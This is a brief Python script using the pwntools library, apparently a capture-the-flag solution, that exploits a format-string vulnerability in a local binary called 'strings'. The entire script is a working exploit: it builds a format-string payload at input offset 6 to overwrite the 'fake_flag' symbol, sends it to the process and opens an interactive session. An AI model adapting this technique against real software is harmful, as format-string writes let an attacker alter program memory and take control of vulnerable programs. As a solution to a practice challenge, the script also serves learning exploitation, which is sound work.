#!/usr/bin/python3

from pwn import *

elf = context.binary = ELF("./strings")

input_offset = 6

io = elf.process()

payload = fmtstr_payload(input_offset,{elf.symbols.fake_flag:b"%s"})

io.sendline(payload)
io.interactive()
